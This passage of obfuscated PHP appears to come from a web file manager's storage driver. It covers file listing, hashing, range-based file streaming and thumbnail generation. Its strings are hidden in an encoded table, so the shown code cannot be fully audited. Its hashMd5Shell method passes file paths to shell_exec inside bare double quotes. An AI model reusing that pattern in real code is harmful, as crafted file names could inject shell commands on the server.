$œ‹‚‚À = $this->listAll($çûÃÎ“õ); return $this->listAllSimpleMake($œ‹‚‚À, $this->getPathOuter($çûÃÎ“õ), $Öùæ¯İØ); } public function listAllSimpleMake($ôüØøëÀ, $ÏƒÑ¾á®, $ƒ›áÕ) { $‰âôô¬Š =& $_SERVER[±Ö‰ô½¯]; $”åûÔ—Ö = array(); $ÏƒÑ¾á® = rtrim(get_path_father($ÏƒÑ¾á®), $‰âôô¬Š[8]) . $‰âôô¬Š[8]; foreach ($ôüØøëÀ as $ßÉ™Åî») { $÷ÍêçÈ = array($‰âôô¬Š[87] => $ßÉ™Åî»[$‰âôô¬Š[87]], $‰âôô¬Š[89] => $ßÉ™Åî»[$‰âôô¬Š[87]], $‰âôô¬Š[78] => $ßÉ™Åî»[$‰âôô¬Š[78]]); if (isset($ßÉ™Åî»[$‰âôô¬Š[79]]) && !$ßÉ™Åî»[$‰âôô¬Š[78]]) { $÷ÍêçÈ[$‰âôô¬Š[79]] = $ßÉ™Åî»[$‰âôô¬Š[79]]; } if (isset($ßÉ™Åî»[$‰âôô¬Š[88]])) { $÷ÍêçÈ[$‰âôô¬Š[88]] = $ßÉ™Åî»[$‰âôô¬Š[88]]; } if (is_array($ßÉ™Åî»[$‰âôô¬Š[90]])) { $÷ÍêçÈ[$‰âôô¬Š[89]] = $ßÉ™Åî»[$‰âôô¬Š[90]][$‰âôô¬Š[87]]; $÷ÍêçÈ[$‰âôô¬Š[79]] = $ßÉ™Åî»[$‰âôô¬Š[90]][$‰âôô¬Š[79]]; $÷ÍêçÈ[$‰âôô¬Š[88]] = $ßÉ™Åî»[$‰âôô¬Š[90]][$‰âôô¬Š[88]]; } else { if (substr($ßÉ™Åî»[$‰âôô¬Š[87]], 0, strlen($ÏƒÑ¾á®)) == $ÏƒÑ¾á®) { $÷ÍêçÈ[$‰âôô¬Š[87]] = substr($ßÉ™Åî»[$‰âôô¬Š[87]], strlen($ÏƒÑ¾á®)); } } $Ü‘ğï¹‰ = $ßÉ™Åî»[$‰âôô¬Š[78]] ? $‰âôô¬Š[8] : $‰âôô¬Š[12]; $÷ÍêçÈ[$‰âôô¬Š[89]] = rtrim($÷ÍêçÈ[$‰âôô¬Š[89]], $‰âôô¬Š[8]) . $Ü‘ğï¹‰; $÷ÍêçÈ[$‰âôô¬Š[87]] = $‰âôô¬Š[8] . trim($÷ÍêçÈ[$‰âôô¬Š[87]], $‰âôô¬Š[8]) . $Ü‘ğï¹‰; if (!$ƒ›áÕ) { $ß¤®æ×ñ = explode($‰âôô¬Š[8], trim($÷ÍêçÈ[$‰âôô¬Š[87]], $‰âôô¬Š[8])); $÷ÍêçÈ[$‰âôô¬Š[87]] = $‰âôô¬Š[8] . implode($‰âôô¬Š[8], array_slice($ß¤®æ×ñ, 1)) . $Ü‘ğï¹‰; } $”åûÔ—Ö[] = $÷ÍêçÈ; } return array_sort_by($”åûÔ—Ö, $‰âôô¬Š[87]); } public function upload($’ä ¥“Ë, $“ÙÍãóÊ, $¦ìäóÃÕ = false, $°—ªôœı = REPEAT_REPLACE) { } public function uploadFileByID($èàÖÏñ…, $“»¦˜š¤, $Ğ¬ˆ”—Ç) { } public function uploadFileByPath($êÄ©Ü²İ, $”‹¢¡ÈÌ, $ı®¾£‹Ğ = array()) { } public function isUploadServer() { $şèêäİ =& $_SERVER[±Ö‰ô½¯]; if (isset($this->ioUploadServer) && $this->ioUploadServer == $şèêäİ[91]) { return !0; } return $GLOBALS[$şèêäİ[6]][$şèêäİ[92]][$şèêäİ[93]]; } public function isFileOutServer() { $é“ùÀÛ =& $_SERVER[±Ö‰ô½¯]; if (isset($this->ioFileOutServer) && $this->ioFileOutServer == $é“ùÀÛ[91]) { return !0; } return $GLOBALS[$é“ùÀÛ[6]][$é“ùÀÛ[92]][$é“ùÀÛ[94]]; } public function isCdnHost() { if ($this->isFileOutServer() || empty($this->cdnHost)) { return !1; } return request_url_safe($this->cdnHost) ? !0 : !1; } public function getCdnLink($ó‘Üˆ­¢) { $¿üÂÜ×­ =& $_SERVER[±Ö‰ô½¯]; if (!$this->isCdnHost()) { return $ó‘Üˆ­¢; } return str_replace(trim(get_url_root($ó‘Üˆ­¢), $¿üÂÜ×­[8]), trim($this->cdnHost, $¿üÂÜ×­[8]), $ó‘Üˆ­¢); } public function uploadLink($íĞß€Ü½, $ÍîĞ—õÜ = 0) { $›ÙŞ™şâ =& $_SERVER[±Ö‰ô½¯]; if ($this->isUploadServer()) { return; } $“¹Ì±—Ú = $this->getType(); if (!in_array($“¹Ì±—Ú, $this->objectDriver)) { return; } if (!$this->isBucketCors()) { return; } $íõ£Æ§Ï = 1024 * 1024 * 10; $»…Áö÷… = (!$ÍîĞ—õÜ ? 1 : ceil($ÍîĞ—õÜ / pow(1024, 3))) * 3600 * 4; if ($ÍîĞ—õÜ <= $íõ£Æ§Ï) { $ü°ß¥Ã€ = $this->uploadFormData($íĞß€Ü½, $»…Áö÷…); } else { $ü°ß¥Ã€ = $this->uploadMultiData($íĞß€Ü½, $»…Áö÷…); } if ($ü°ß¥Ã€) { $ü°ß¥Ã€[$›ÙŞ™şâ[95]] = $íĞß€Ü½; $ü°ß¥Ã€[$›ÙŞ™şâ[96]] = $“¹Ì±—Ú; } return $ü°ß¥Ã€; } public function uploadFormData($Ä€Úù¹, $Æ³ª½³Ê = 3600) { } public function uploadMultiData($­Œ­–‡™, $ªšäç§¾ = 3600) { } public function multiUploadFormData($Ï©ÄÓÅ, $×êÑ¡— = 3600) { return $this->uploadMultiData($Ï©ÄÓÅ, $×êÑ¡—); } public function download($¦œ•˜–ß, $­²…û¾Ş) { } public function ext($ûØâ¾î) { $Ëû¬àÛ· =& $_SERVER[±Ö‰ô½¯]; if (strpos($ûØâ¾î, $Ëû¬àÛ·[8]) === -1) { $™çÃé¢ú = $ûØâ¾î; } else { $™çÃé¢ú = $this->pathThis($ûØâ¾î); } $íÜÀ‰Â = $Ëû¬àÛ·[12]; if (strstr($™çÃé¢ú, $Ëû¬àÛ·[10])) { $íÜÀ‰Â = substr($™çÃé¢ú, strrpos($™çÃé¢ú, $Ëû¬àÛ·[10]) + 1); $íÜÀ‰Â = strtolower($íÜÀ‰Â); } if (strlen($íÜÀ‰Â) > 3 && preg_match($Ëû¬àÛ·[97], $íÜÀ‰Â, $ñêóó¯)) { $íÜÀ‰Â = $Ëû¬àÛ·[12]; } return $íÜÀ‰Â; } public function pathThis($óÖƒ©…‘) { $à®çéÂ =& $_SERVER[±Ö‰ô½¯]; $óÖƒ©…‘ = str_replace($à®çéÂ[98], $à®çéÂ[8], rtrim($óÖƒ©…‘, $à®çéÂ[8])); $à¤ÕÊŒ = strrpos($óÖƒ©…‘, $à®çéÂ[8]); if ($à¤ÕÊŒ === !1) { return $óÖƒ©…‘; } return substr($óÖƒ©…‘, $à¤ÕÊŒ + 1); } public function pathFather($àğşü×) { $ƒ¿î˜¼Î =& $_SERVER[±Ö‰ô½¯]; $àğşü× = str_replace($ƒ¿î˜¼Î[98], $ƒ¿î˜¼Î[8], rtrim($àğşü×, $ƒ¿î˜¼Î[8])); $üˆÛœ = strrpos($àğşü×, $ƒ¿î˜¼Î[8]); if ($üˆÛœ === !1) { return $ƒ¿î˜¼Î[12]; } return substr($àğşü×, 0, $üˆÛœ + 1); } public function hashSimple($š”¸¬¨ë) { $¾ÏƒÖ»¢ =& $_SERVER[±Ö‰ô½¯]; if (!$š”¸¬¨ë) { return md5($¾ÏƒÖ»¢[12]); } $¸í•Õ¹Š = $this->size($š”¸¬¨ë); $ÅÏ¿Ÿ©ù = 200; $¢ê‹ó±û = 50; if ($¸í•Õ¹Š <= $ÅÏ¿Ÿ©ù * $¢ê‹ó±û) { return $this->hashMd5($š”¸¬¨ë) . $¸í•Õ¹Š; } $¼×éû– = intval($¸í•Õ¹Š / $¢ê‹ó±û); $İšĞÃş = $¾ÏƒÖ»¢[12]; for ($Ó¼…ìÀ× = 0; $Ó¼…ìÀ× < $¢ê‹ó±û; $Ó¼…ìÀ×++) { $İšĞÃş .= $this->fileSubstr($š”¸¬¨ë, $¼×éû– * $Ó¼…ìÀ×, $ÅÏ¿Ÿ©ù); } $İšĞÃş .= $this->fileSubstr($š”¸¬¨ë, $¸í•Õ¹Š - $ÅÏ¿Ÿ©ù, $ÅÏ¿Ÿ©ù); return md5($İšĞÃş) . $¸í•Õ¹Š; } public static $md5Cache = array(); public function hashMd5($æ«‚ŠŞğ) { if (!$æ«‚ŠŞğ) { return md5($_SERVER[±Ö‰ô½¯][12]); } $æ«‚ŠŞğ = $this->iconvSystem($æ«‚ŠŞğ); if (isset(self::$md5Cache[$æ«‚ŠŞğ])) { return self::$md5Cache[$æ«‚ŠŞğ]; } self::$md5Cache[$æ«‚ŠŞğ] = $this->hashMd5Shell($æ«‚ŠŞğ); if (!self::$md5Cache[$æ«‚ŠŞğ]) { self::$md5Cache[$æ«‚ŠŞğ] = @md5_file($æ«‚ŠŞğ); } return self::$md5Cache[$æ«‚ŠŞğ]; } private function hashMd5Shell($ÓóµßĞÆ) { $Áíé¤öÌ =& $_SERVER[±Ö‰ô½¯]; if (!$ÓóµßĞÆ) { return md5($Áíé¤öÌ[12]); } if (!function_exists($Áíé¤öÌ[99])) { return !1; } $‹¦çŸıŠ = array($Áíé¤öÌ[100], $Áíé¤öÌ[101]); $ï÷äİİ‘ = Cache::get($Áíé¤öÌ[102]); if (!$ï÷äİİ‘) { $İÂú€ = BASIC_PATH . $Áíé¤öÌ[103]; $ßß¯Í× = md5_file($İÂú€); $ï÷äİİ‘ = $Áíé¤öÌ[104]; foreach ($‹¦çŸıŠ as $ç‰“½³¹) { $äÖí’Òä = shell_exec($ç‰“½³¹ . "\x20\x22{$İÂú€}\42"); if ($äÖí’Òä && substr(trim($äÖí’Òä), 0, 32) == $ßß¯Í×) { $ï÷äİİ‘ = $ç‰“½³¹; break; } } Cache::set($Áíé¤öÌ[102], $ï÷äİİ‘, 3600); } if ($ï÷äİİ‘ == $Áíé¤öÌ[104]) { return !1; } $äÖí’Òä = shell_exec($ï÷äİİ‘ . "\40\x22{$ÓóµßĞÆ}\42"); $äÖí’Òä = str_replace($Áíé¤öÌ[105], $Áíé¤öÌ[12], $äÖí’Òä); return substr($äÖí’Òä, 0, 32); } public function link($“á“¬Œ±) { return $“á“¬Œ±; } public function fileOut($·¹ñ¯Í, $ÆÚ¯û¢ = false, $¦¦§Úø° = false, $‹ÒÌâ·î = '') { $Ì©¯ŠŒå =& $_SERVER[±Ö‰ô½¯]; $this->cacheMethod(null, null); if (!$·¹ñ¯Í || !$this->exist($·¹ñ¯Í)) { show_json(LNG($Ì©¯ŠŒå[106]), !1, $¦¦§Úø°); } $ÀÏå½í¢ = $this->getType() == $Ì©¯ŠŒå[107]; $¿Ò¥¬¦¦ = $GLOBALS[$Ì©¯ŠŒå[6]][$Ì©¯ŠŒå[92]][$Ì©¯ŠŒå[108]][$Ì©¯ŠŒå[109]]; $«ÕÚ€“á = (double) $GLOBALS[$Ì©¯ŠŒå[6]][$Ì©¯ŠŒå[92]][$Ì©¯ŠŒå[108]][$Ì©¯ŠŒå[110]] * 1024 * 1024; @ob_end_clean(); set_timeout(); $†¢ãš»Ù = $this->infoFull($·¹ñ¯Í); $¤›Ãšß÷ = $†¢ãš»Ù[$Ì©¯ŠŒå[79]]; $¸åçÖ³¡ = gmdate($Ì©¯ŠŒå[111], $†¢ãš»Ù[$Ì©¯ŠŒå[88]]); $·£åàÍÅ = $¦¦§Úø° ? $¦¦§Úø° : $this->iconvApp($†¢ãš»Ù[$Ì©¯ŠŒå[32]]); $·¤½’ç¾ = 0; $Ñî«Œè = $¤›Ãšß÷ - 1; $¹ä„¢÷Ó = $this->ext($·£åàÍÅ); if (in_array($¹ä„¢÷Ó, array($Ì©¯ŠŒå[112], $Ì©¯ŠŒå[113], $Ì©¯ŠŒå[114], $Ì©¯ŠŒå[115]))) { $¹ä„¢÷Ó = $Ì©¯ŠŒå[116]; } if (in_array($¹ä„¢÷Ó, array($Ì©¯ŠŒå[117]))) { $¹ä„¢÷Ó = $Ì©¯ŠŒå[118]; } if (!$‹ÒÌâ·î) { $‹ÒÌâ·î = md5($¸åçÖ³¡ . $¤›Ãšß÷); } $‹ÒÌâ·î = $Ì©¯ŠŒå[119] . $‹ÒÌâ·î . $Ì©¯ŠŒå[119]; $®ü³‚³÷ = get_file_mime($¹ä„¢÷Ó); $Ì£ÍĞ½ì = !0; $Ì£ÍĞ½ì = isset($_GET[$Ì©¯ŠŒå[120]]) ? !1 : !0; if ($ÆÚ¯û¢ === !1 && !mime_support($®ü³‚³÷)) { $®ü³‚³÷ = $Ì©¯ŠŒå[121]; } header($Ì©¯ŠŒå[122]); header($Ì©¯ŠŒå[123] . $®ü³‚³÷); $ëàÑ€ˆ£ = rawurlencode($·£åàÍÅ); $ëàÑ€ˆ£ = $Ì©¯ŠŒå[119] . $ëàÑ€ˆ£ . $Ì©¯ŠŒå[124] . $ëàÑ€ˆ£; if ($ÆÚ¯û¢) { header($Ì©¯ŠŒå[125]); header($Ì©¯ŠŒå[126]); header($Ì©¯ŠŒå[127] . $ëàÑ€ˆ£); } else { if ($Ì£ÍĞ½ì) { header($Ì©¯ŠŒå[128] . $ëàÑ€ˆ£); } } $Ò±â¡Û = 3600 * 24 * 30; header($Ì©¯ŠŒå[129]); header($Ì©¯ŠŒå[130]); header($Ì©¯ŠŒå[131] . $Ò±â¡Û); header($Ì©¯ŠŒå[132] . gmdate($Ì©¯ŠŒå[111], time() + $Ò±â¡Û) . $Ì©¯ŠŒå[133]); if (isset($_SERVER[$Ì©¯ŠŒå[134]]) && strtotime($_SERVER[$Ì©¯ŠŒå[134]]) == $†¢ãš»Ù[$Ì©¯ŠŒå[88]]) { header($Ì©¯ŠŒå[135], !0, 304); die; } if (isset($_SERVER[$Ì©¯ŠŒå[136]]) && $_SERVER[$Ì©¯ŠŒå[136]] == $‹ÒÌâ·î) { header($Ì©¯ŠŒå[137] . $‹ÒÌâ·î, !0, 304); die; } header($Ì©¯ŠŒå[137] . $‹ÒÌâ·î); header($Ì©¯ŠŒå[138] . $¸åçÖ³¡ . $Ì©¯ŠŒå[133]); header($Ì©¯ŠŒå[139] . rawurlencode($·£åàÍÅ)); header($Ì©¯ŠŒå[140]); header($Ì©¯ŠŒå[141] . $¤›Ãšß÷); header($Ì©¯ŠŒå[142]); Hook::trigger($Ì©¯ŠŒå[143], $·¹ñ¯Í, $¤›Ãšß÷, $·£åàÍÅ, $¹ä„¢÷Ó); if (!$ÆÚ¯û¢ && $¹ä„¢÷Ó == $Ì©¯ŠŒå[144]) { if ($¤›Ãšß÷ > 1024 * 1024 * 10) { die; } $—Èè°É = $this->getContent($·¹ñ¯Í); $—Èè°É = Html::clearSVG($—Èè°É); header($Ì©¯ŠŒå[145] . strlen($—Èè°É)); echo $—Èè°É; die; } $°˜½ËÎ½ = strtolower($_SERVER[$Ì©¯ŠŒå[146]]); if ($ÀÏå½í¢ && $°˜½ËÎ½ && $¿Ò¥¬¦¦) { if (strstr($°˜½ËÎ½, $Ì©¯ŠŒå[147])) { header($Ì©¯ŠŒå[148] . $·¹ñ¯Í); } else { if (strstr($°˜½ËÎ½, $Ì©¯ŠŒå[149])) { header($Ì©¯ŠŒå[150] . $·¹ñ¯Í); } else { if (strstr($°˜½ËÎ½, $Ì©¯ŠŒå[151])) { header($Ì©¯ŠŒå[152] . $·¹ñ¯Í); } } } if ($«ÕÚ€“á) { header($Ì©¯ŠŒå[153] . $«ÕÚ€“á); } return; } if (isset($_SERVER[$Ì©¯ŠŒå[154]])) { if (preg_match($Ì©¯ŠŒå[155], $_SERVER[$Ì©¯ŠŒå[154]], $Ãµ€ë¢Ñ)) { $·¤½’ç¾ = intval($Ãµ€ë¢Ñ[1]); $·¤½’ç¾ = $·¤½’ç¾ <= 0 ? 0 : ($·¤½’ç¾ >= $Ñî«Œè ? $Ñî«Œè : $·¤½’ç¾); if (!empty($Ãµ€ë¢Ñ[2])) { $÷­êğë¶ = intval($Ãµ€ë¢Ñ[2]); $Ñî«Œè = $÷­êğë¶ < $·¤½’ç¾ ? $·¤½’ç¾ : ($÷­êğë¶ >= $Ñî«Œè ? $Ñî«Œè : $÷­êğë¶); } } header($Ì©¯ŠŒå[156]); header("\x43\x6f\x6e\x74\145\156\164\55\x52\x61\x6e\147\145\72\x20\142\x79\164\x65\163\40{$·¤½’ç¾}\x2d{$Ñî«Œè}\57" . $¤›Ãšß÷); } else { header($Ì©¯ŠŒå[157]); } header($Ì©¯ŠŒå[158]); header($Ì©¯ŠŒå[159]); $Ãªã§Á° = !0; if ($_SERVER[$Ì©¯ŠŒå[160]] == $Ì©¯ŠŒå[161] && $¤›Ãšß÷ > 1204 * 1024 * 1024 * 2) { $Ãªã§Á° = !1; } if ($Ãªã§Á°) { header($Ì©¯ŠŒå[162] . ($Ñî«Œè - $·¤½’ç¾ + 1)); } if ($_SERVER[$Ì©¯ŠŒå[163]] == $Ì©¯ŠŒå[164]) { return; } $¬ÜÉÛëå = array($Ì©¯ŠŒå[165] => !1, $Ì©¯ŠŒå[166] => $·¤½’ç¾, $Ì©¯ŠŒå[167] => $Ñî«Œè, $Ì©¯ŠŒå[168] => $¹ä„¢÷Ó, $Ì©¯ŠŒå[169] => $†¢ãš»Ù, $Ì©¯ŠŒå[170] => $Ì©¯ŠŒå[12], $Ì©¯ŠŒå[171] => 0); $¬ÜÉÛëå = Hook::filter($Ì©¯ŠŒå[172], $¬ÜÉÛëå); $™¦¼ê˜Æ = 1024 * 300; $¥Í†üÙÇ = 0; if ($«ÕÚ€“á) { $¥Í†üÙÇ = intval(1000 * 1000 * ($™¦¼ê˜Æ / $«ÕÚ€“á)); } while ($·¤½’ç¾ <= $Ñî«Œè) { $ ê¼¯ ­ = timeFloat(); check_abort(); $‚…ü­‰¢ = $Ñî«Œè - $·¤½’ç¾ + 1; if ($‚…ü­‰¢ <= $™¦¼ê˜Æ) { $™¦¼ê˜Æ = $‚…ü­‰¢; } $—Èè°É = $this->fileSubstr($·¹ñ¯Í, $·¤½’ç¾, $™¦¼ê˜Æ); if ($¬ÜÉÛëå[$Ì©¯ŠŒå[165]]) { $¬ÜÉÛëå[$Ì©¯ŠŒå[170]] = $—Èè°É; $¬ÜÉÛëå[$Ì©¯ŠŒå[171]] = $·¤½’ç¾; $¬ÜÉÛëå = Hook::filter($Ì©¯ŠŒå[173], $¬ÜÉÛëå); $—Èè°É = $¬ÜÉÛëå[$Ì©¯ŠŒå[170]]; } echo $—Èè°É; $·¤½’ç¾ += $™¦¼ê˜Æ; if ($™¦¼ê˜Æ == $‚…ü­‰¢) { $·¤½’ç¾ = $Ñî«Œè + 1; } if ($¥Í†üÙÇ) { $œû¸øÁ¨ = intval(1000 * 1000 * (timeFloat() - $ ê¼¯ ­)); $«™ĞÙæÉ = $¥Í†üÙÇ - $œû¸øÁ¨; if ($«™ĞÙæÉ > 5) { usleep($«™ĞÙæÉ); } } } } public function fileOutServer($É”Ú£¶ß, $ö¼®§ãÚ = false, $—¯¦İ‚ = false, $Á£‡â·‚ = '') { $this->fileOut($É”Ú£¶ß, $ö¼®§ãÚ, $—¯¦İ‚, $Á£‡â·‚); } public function fileOutLink($Çî¡ÍÊ) { header($_SERVER[±Ö‰ô½¯][174] . $Çî¡ÍÊ); die; } public function cacheMethod($ßëËœÜä, $½ÄêüÜ, $¿¶€±Çù = null) { $÷¡œììÂ =& $_SERVER[±Ö‰ô½¯]; static $¥úÇüäæ = array(); $¡²ì€İı = $½ÄêüÜ ? ltrim($this->getPathOuter($½ÄêüÜ), $÷¡œììÂ[8]) : $÷¡œììÂ[12]; $’§€£ë = $÷¡œììÂ[175] . $ßëËœÜä . $÷¡œììÂ[176] . rtrim($¡²ì€İı, $÷¡œììÂ[8]); if (is_null($ßëËœÜä)) { $¥úÇüäæ = array(); return; } if (is_null($½ÄêüÜ)) { foreach ($¥úÇüäæ as $’§€£ë => $çı±Ë‘‡) { if (!strstr($’§€£ë, $÷¡œììÂ[175] . $ßëËœÜä . $÷¡œììÂ[177])) { continue; } unset($¥úÇüäæ[$’§€£ë]); } return; } if ($¿¶€±Çù === $÷¡œììÂ[178]) { unset($¥úÇüäæ[$’§€£ë]); return; } if (!is_null($¿¶€±Çù)) { $¥úÇüäæ[$’§€£ë] = $¿¶€±Çù; return; } $êÛÄ”« = isset($¥úÇüäæ[$’§€£ë]) ? $¥úÇüäæ[$’§€£ë] : null; if (!is_null($êÛÄ”«)) { return $êÛÄ”«; } $êÛÄ”« = $this->{$ßëËœÜä}($½ÄêüÜ); $¥úÇüäæ[$’§€£ë] = $êÛÄ”«; return $êÛÄ”«; } public function cacheMethodInfoSet($Ü¸Ôğó¤, $”áµ£„Ñ, $ä¸È‚µ§ = false) { $êšµï‹ =& $_SERVER[±Ö‰ô½¯]; if ($this->listItemCache === !1) { return; } $this->cacheMethod($êšµï‹[179], $Ü¸Ôğó¤, $”áµ£„Ñ); $this->cacheMethod($êšµï‹[180], $Ü¸Ôğó¤, $”áµ£„Ñ ? !1 : !0); if (is_array($ä¸È‚µ§)) { $this->cacheMethod($êšµï‹[181], $Ü¸Ôğó¤, $ä¸È‚µ§); } } public function fileOutImage($´©´–, $Ş»¹Ğ‘ß = 250) { $§†¡“î =& $_SERVER[±Ö‰ô½¯]; set_timeout(); if (substr($´©´–, 0, 4) == $§†¡“î[151]) { $this->fileOutLink($´©´–); } $Œ™¢¹Ôş = $this->info($´©´–); $´‹Éâ” = !1; $½Ñ”èó§ = isset($GLOBALS[$§†¡“î[182]]) ? $GLOBALS[$§†¡“î[182]] : array(); if ($½Ñ”èó§ && $½Ñ”èó§[$§†¡“î[183]] == $Œ™¢¹Ôş[$§†¡“î[87]]) { $Œ™¢¹Ôş = $½Ñ”èó§; $º‚‰–İ = $Œ™¢¹Ôş[$§†¡“î[184]]; if ($º‚‰–İ && isset($º‚‰–İ[$§†¡“î[185]])) { if ($º‚‰–İ[$§†¡“î[185]] <= $Ş»¹Ğ‘ß && $º‚‰–İ[$§†¡“î[186]] <= $Ş»¹Ğ‘ß) { $´‹Éâ” = !0; } } } if ($Œ™¢¹Ôş[$§†¡“î[79]] <= 1024 * 50 || $´‹Éâ” || !function_exists($§†¡“î[187]) || $Œ™¢¹Ôş[$§†¡“î[168]] == $§†¡“î[188]) { return $this->fileOut($´©´–, !1, $Œ™¢¹Ôş[$§†¡“î[32]]); } $´†Å…ÀĞ = kodIO::hashPath($Œ™¢¹Ôş); $‹¸‚­Û = "\143\x6f\x76\x65\162\137{$´†Å…ÀĞ}\x5f{$Ş»¹Ğ‘ß}\x2e\x70\x6e\x67"; $­ıƒùó = IO_PATH_SYSTEM_TEMP . $§†¡“î[189]; $¦Öô®º‹ = IO::infoFullSimple($­ıƒùó); $»Í¿Ü¼œ = $¦Öô®º‹ && is_array($¦Öô®º‹) ? $¦Öô®º‹[$§†¡“î[87]] : $§†¡“î[12]; if (!$»Í¿Ü¼œ) { $»Í¿Ü¼œ = IO::mkdir($­ıƒùó); } if ($Œ™¢¹Ôş[$§†¡“î[190]] == $§†¡“î[191] && isset($Œ™¢¹Ôş[$§†¡“î[192]]) && $Œ™¢¹Ôş[$§†¡“î[192]] == kodIO::sourceID($»Í¿Ü¼œ)) { $üÉê’˜² = $Œ™¢¹Ôş[$§†¡“î[193]]; if ($Ş»¹Ğ‘ß <= 500) { $àÔ‚Æï = preg_replace($§†¡“î[194], $§†¡“î[195], $Œ™¢¹Ôş[$§†¡“î[32]]); $üÉê’˜² = IO::fileNameExist($»Í¿Ü¼œ, $àÔ‚Æï); } return IO::fileOut(KodIO::make($üÉê’˜²), !1, $Œ™¢¹Ôş[$§†¡“î[32]]); } $äèÅ»´’ = IO::fileNameExist($»Í¿Ü¼œ, $‹¸‚­Û); if ($äèÅ»´’) { return IO::fileOut(KodIO::make($äèÅ»´’), !1, $Œ™¢¹Ôş[$§†¡“î[32]]); } if ($Ş»¹Ğ‘ß > 1000) { $this->makeImageCover($»Í¿Ü¼œ, $´©´–, $‹¸‚­Û, $Ş»¹Ğ‘ß); $this->makeImageCover($»Í¿Ü¼œ, $´©´–, "\143\157\166\145\x72\137{$´†Å…ÀĞ}\137\x32\65\x30\56\160\x6e\147", 250); $äèÅ»´’ = IO::fileNameExist($»Í¿Ü¼œ, $‹¸‚­Û); if ($äèÅ»´’) { return IO::fileOut(KodIO::make($äèÅ»´’), !1, $Œ™¢¹Ôş[$§†¡“î[32]]); } die; } if (!kodIO::allowCover($Œ™¢¹Ôş)) { return $this->fileOut($´©´–, !1, $Œ™¢¹Ôş[$§†¡“î[32]]); } $ÙñÃÓ¾ò = Cache::get($‹¸‚­Û); if ($ÙñÃÓ¾ò == $§†¡“î[196] || $ÙñÃÓ¾ò == $§†¡“î[197]) { echo $ÙñÃÓ¾ò; die; } Cache::set($‹¸‚­Û, $§†¡“î[197], 60); $´ºÙñã° = array($»Í¿Ü¼œ, $Œ™¢¹Ôş[$§†¡“î[87]], $‹¸‚­Û, $Ş»¹Ğ‘ß); $•ª—Ë— = $§†¡“î[198] . $Œ™¢¹Ôş[$§†¡“î[79]] . $§†¡“î[199] . $‹¸‚­Û . $§†¡“î[200] . $Œ™¢¹Ôş[$§†¡“î[32]] . $§†¡“î[201] . $Œ™¢¹Ôş[$§†¡“î[87]]; TaskQueue::add($§†¡“î[202], $´ºÙñã°, $•ª—Ë—, $‹¸‚­Û); } public function makeImageCover($†ãß÷àß, $–ÃÈ©ı, $šÒŒıŠò, $Ç™·†òŸ) { $ôé„­Ÿ± =& $_SERVER[±Ö‰ô½¯]; if (IO::fileNameExist($†ãß÷àß, $šÒŒıŠò)) { return $ôé„­Ÿ±[203]; } if (!is_dir(DATA_THUMB)) { mk_dir(DATA_THUMB); } if (!is_dir(TEMP_FILES)) { mk_dir(TEMP_FILES); } $“Æ¬Ì¼“ = $this->getPathOuter($–ÃÈ©ı); $ğÅâ¨©× = DATA_THUMB . $šÒŒıŠò; del_file($ğÅâ¨©×); $Ëù£Ü°› = IO::copy($“Æ¬Ì¼“, TEMP_FILES, !1, $šÒŒıŠò); if (!@file_exists($Ëù£Ü°›)) { return $ôé„­Ÿ±[204]; } ImageThumb::createThumb($Ëù£Ü°›, $ğÅâ¨©×, $Ç™·†òŸ, $Ç™·†òŸ * 10); if (@file_exists($ğÅâ¨©×)) { Cache::remove($šÒŒıŠò); return IO::move($ğÅâ¨©×, $†ãß÷àß); } Cache::set($šÒŒıŠò, $ôé„­Ÿ±[196], 600); del_file($ğÅâ¨©×); return $ôé„­Ÿ±[205] . $Ëù£Ü°› . $ôé„­Ÿ±[74]; } public function fileOutImageServer($ÂŞÀÏûÜ, $ã„åï°ë = 250) { $this->fileOutImage($ÂŞÀÏûÜ, $ã„åï°ë); } public function fileNameAuto($³„û®Ú, $ÒÙğî¹¯, $Ñ–›Ôè² = REPEAT_RENAME, $Ñ³È­¼ß = false) { $°­ñäÂ´ =& $_SERVER[±Ö‰ô½¯]; $ˆÉ½ç“Š = $³„û®Ú === $°­ñäÂ´[12] ? $ÒÙğî¹¯ : rtrim($³„û®Ú, $°­ñäÂ´[8]) . $°­ñäÂ´[8] . $ÒÙğî¹¯; if ($Ñ–›Ôè² == REPEAT_REPLACE || !$this->exist($ˆÉ½ç“Š) || $Ñ³È­¼ß && $Ñ–›Ôè² != REPEAT_RENAME_FOLDER) { return $ÒÙğî¹¯; } if ($Ñ–›Ôè² == REPEAT_SKIP) { return !1; } $£²Ş•¶‡ = $°­ñäÂ´[10] . get_path_ext($ÒÙğî¹¯); $£²Ş•¶‡ = $£²Ş•¶‡ == $°­ñäÂ´[10] || $Ñ³È­¼ß ? $°­ñäÂ´[12] : $£²Ş•¶‡; $¦ª•İ’£ = 1; $Ë˜³é· = substr($ÒÙğî¹¯, 0, strlen($ÒÙğî¹¯) - strlen($£²Ş•¶‡)); $¶ˆÂ˜­ = $Ë˜³é· . "\50{$¦ª•İ’£}\x29{$£²Ş•¶‡}"; while ($this->exist(rtrim($³„û®Ú, $°­ñäÂ´[8]) . $°­ñäÂ´[8] . $¶ˆÂ˜­)) { $¶ˆÂ˜­ = $Ë˜³é· . "\x28{$¦ª•İ’£}\x29{$£²Ş•¶‡}"; $¦ª•İ’£++; } return $¶ˆÂ˜­; } private function fileNameAutoList($ÎÎµ×Å˜, $”ô½ŠŒ›, $êÌ…¹í÷ = false) { $£í§®¯¡ =& $_SERVER[±Ö‰ô½¯]; $¾³û²Ê’ = $this->listPath($ÎÎµ×Å˜, !0); $¾³û²Ê’ = array_merge($¾³û²Ê’[$£í§®¯¡[85]], $¾³û²Ê’[$£í§®¯¡[86]]); $ëšíã¼¬ = array_to_keyvalue($¾³û²Ê’, $£í§®¯¡[12], $£í§®¯¡[32]); $»Ûğ€ = $£í§®¯¡[10] . get_path_ext($”ô½ŠŒ›); $»Ûğ€ = $»Ûğ€ == $£í§®¯¡[10] || $êÌ…¹í÷ ? $£í§®¯¡[12] : $»Ûğ€; $“øš°Ñè = substr($”ô½ŠŒ›, 0, strlen($”ô½ŠŒ›) - strlen($»Ûğ€)); $”€‹éÎ™ = $“øš°Ñè . "\x28\x30\x29{$»Ûğ€}"; for ($·Å´éÒ¦ = 1; $·Å´éÒ¦ <= count($ëšíã¼¬) + 1; $·Å´éÒ¦++) { $”€‹éÎ™ = $“øš°Ñè . "\50{$·Å´éÒ¦}\51{$»Ûğ€}"; if (!in_array_not_case($”€‹éÎ™, $ëšíã¼¬)) { return $”€‹éÎ™; } } return $”€‹éÎ™; } public function listAllFiles($âİÊÍ£, $¼ÈÊêö‹) { $†ıù¼„ =& $_SERVER[±Ö‰ô½¯]; if (empty($¼ÈÊêö‹)) 